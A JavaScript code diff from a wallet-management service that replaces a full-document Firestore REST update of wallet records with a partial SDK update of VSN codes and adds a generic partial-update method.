-          credentials: { stringValue: wallet.credentials || '' },
-          telegramUsername: { stringValue: wallet.telegramUsername || '' }, // Preserve Telegram association
-          createdAt: { timestampValue: wallet.createdAt },
-          balanceLastUpdated: { timestampValue: wallet.balanceLastUpdated },
-          solsnipeBalanceLastUpdated: { timestampValue: wallet.solsnipeBalanceLastUpdated || new Date().toISOString() },
-          depositedAmountLastUpdated: { timestampValue: wallet.depositedAmountLastUpdated || new Date().toISOString() },
-          lastLoginAt: { timestampValue: wallet.lastLoginAt },
-          loginCount: { integerValue: wallet.loginCount || 0 },
-          totalSolsnipeCredited: { doubleValue: wallet.totalSolsnipeCredited || 0 },
-          totalSolCredited: { doubleValue: wallet.totalSolCredited || 0 },
-          totalDeposited: { doubleValue: wallet.totalDeposited || 0 },
-          autoSnipeBot: { integerValue: wallet.autoSnipeBot || 0 },
-          totalTrade: { integerValue: wallet.totalTrade || 0 },
-          withdrawal: { stringValue: wallet.withdrawal || '' },
-          vsnCodes: { stringValue: JSON.stringify(vsnCodes) },
-          vsnCodesUpdatedAt: { timestampValue: new Date().toISOString() },
-          transactions: {
-            arrayValue: {
-              values: (wallet.transactions || []).map(tx => ({ stringValue: tx }))
-            }
-          }
-        }
-      };
-
-      const response = await fetch(docPath, {
-        method: 'PATCH',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(updateData)
+      await this.db.collection(WALLETS).doc(walletId).update({
+        vsnCodes: JSON.stringify(vsnCodes),
+        vsnCodesUpdatedAt: new Date().toISOString()
       });
-
-      if (!response.ok) {
-        const error = await response.json();
-        throw new Error(`Firebase update failed: ${error.error?.message || 'Unknown error'}`);
-      }
 
       await this.logAdminOperation(wallet.walletAddress, adminId, 'update-vsn-codes', vsnCodes.length);
 
-      return await response.json();
+      return { success: true, walletId };
     } catch (error) {
       throw new Error(`Failed to update VSN codes: ${error.message}`);
+    }
+  }
+
+  /**
+   * Generic partial update - only the fields passed in `partialFields` are
+   * touched, everything else on the document is left untouched.
+   */
+  async updateWalletFields(walletId, partialFields) {
+    try {
+      await this.db.collection(WALLETS).doc(walletId).update(partialFields);
+      return { success: true, walletId };
+    } catch (error) {
+      throw new Error(`Failed to update wallet fields: ${error.message}`);
     }
   }
 }
